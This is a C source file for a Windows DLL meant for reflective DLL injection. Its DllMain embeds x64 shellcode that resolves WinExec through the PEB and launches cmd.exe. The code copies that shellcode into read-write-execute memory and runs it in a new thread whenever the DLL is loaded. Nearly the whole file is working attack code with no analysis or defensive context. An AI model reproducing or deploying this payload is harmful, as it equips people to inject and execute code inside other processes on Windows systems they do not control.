//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	char shellcode[] = "\x48\x81\xc4\xf8\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\xad\x48\x96\x48\xad\x48\x8b\x58\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x4d\x31\xe4\x49\x81\xc4\xff\xff\x8f\x08\x49\xc1\xec\x14\x42\x8b\x14\x23\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1\x67\xe3\x20\x31\xdb\x41\x8b\x5c\x8b\x04\x4c\x01\xc3\x48\xff\xc9\x48\xb8\xff\x57\x69\x6e\x45\x78\x65\x63\x48\xc1\xe8\x08\x48\x39\x03\x75\xdd\x4d\x31\xdb\x44\x8b\x5a\x24\x4d\x01\xc3\x48\xff\xc1\x66\x45\x8b\x2c\x4b\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x44\xab\x04\x4c\x01\xc0\x49\x89\xc6\x48\xb8\x20\x20\x20\x20\x20\x20\x20\x20\x50\x48\xb8\x63\x6d\x64\x2e\x65\x78\x65\x20\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6";


	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);

	switch( dwReason ) 
    { 

		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;

			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}